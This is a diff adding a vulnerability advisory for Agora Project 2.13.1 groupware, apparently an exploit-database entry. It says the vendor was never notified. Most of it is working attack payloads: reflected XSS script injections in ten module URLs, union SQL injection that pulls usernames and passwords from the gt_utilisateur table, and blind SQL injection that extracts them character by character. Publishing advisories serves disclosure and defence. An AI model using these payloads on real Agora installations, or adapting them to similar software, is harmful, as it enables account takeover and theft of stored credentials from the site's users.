@@ -1,0 +1,63 @@
+###################################################################
+Agora Project 2.13.1 Multiple Vulnerabilities
+###################################################################
+ 
+Release Date Bug.          15-06-2012
+Vendor Notification Date.  Never
+Product.                   Agora project
+Affected versions.         2.13.1 and less
+Type.                      No Commercial
+Attack Vector.             XSS, SQLi, BSQLi
+Solution Status.           unpublished
+CVE reference.             Not yet assigned
+Download                   http://www.agora-project.net/divers/download.php
+Demo			   http://www.agora-project.net/demo/
+ 
+I. BACKGROUND
+ 
+Agora-Project is an intuitive groupware under GPL (Based on PHP/MySQL). 
+It contains many modules: File Manager (with versioning), Calendars (with resource calendars),
+Task Manager, Bookmark manager, Contacts, News, Forum, Instant Messaging, etc.
+ 
+II. DESCRIPTION
+ 
+vulnerabilities are XSS, SQLi, BSQLi
+ 
+ 
+III.  EXPLOITATION
+ 
+	XSS 
+	192.168.0.1/module_utilisateurs/utilisateur.php?id_utilisateur"><script>alert('xss')</script>
+	192.168.0.1/module_agenda/evenement.php?id_evenement="><script>alert('xss')</script>
+	192.168.0.1/module_contact/contact.php?id_contact="><script>alert('xss')</script>
+	192.168.0.1/module_contact/index.php?id_dossier="><script>alert('xss')</script>
+	192.168.0.1/module_tache/index.php?id_dossier="><script>alert('xss')</script>
+	192.168.0.1/module_agenda/index.php?printmode="><script>alert('xss')</script>
+	192.168.0.1/module_lien/index.php?id_dossier="><script>alert('xss')</script>
+	192.168.0.1/module_forum/index.php?theme="><script>alert('xss')</script>
+	192.168.0.1/module_fichier/index.php?id_dossier="><script>alert('xss')</script>
+	192.168.0.1/module_tableau_bord/index.php?tdb_periode="><script>alert('xss')</script>
+
+	SQLi
+	To exploit minimum visit to "public" space
+	192.168.0.1/module_forum/index.php?theme=1' and 1=2 union select nom FROM gt_utilisateur WHERE 1 AND '1'='1
+	192.168.0.1/module_forum/index.php?theme=1' and 1=2 union select pass FROM gt_utilisateur WHERE 1 AND '1'='1
+	
+	BSQLi
+	To exploit minimum visit to "public" space
+	192.168.0.1/module_tache/tache.php?id_tache=1'+and+substring(@@version,1,1)='5
+	192.168.0.1/module_tache/tache.php?id_tache=1'+and+(select+1+from+gt_utilisateur+limit+0,1)='1
+
+	192.168.0.1/module_tache/tache.php?id_tache=1'+and+(select+substring(concat(1,pass),1,1)+from+gt_utilisateur+limit+0,1)='1
+	192.168.0.1/module_tache/tache.php?id_tache=1'+and+(select+substring(concat(1,nom),1,1)+from+gt_utilisateur+limit+0,1)='1
+
+	192.168.0.1/module_tache/tache.php?id_tache=1'and ascii(substring((SELECT nom from gt_utilisateur limit 0,1),1,1))>'0'>'0
+	192.168.0.1/module_tache/tache.php?id_tache=1'+and ascii(substring((SELECT nom from gt_utilisateur limit 0,1),1,1))='110
+	...
+
+	
+
+
+ 
+Discovered by.
+Chris Russell
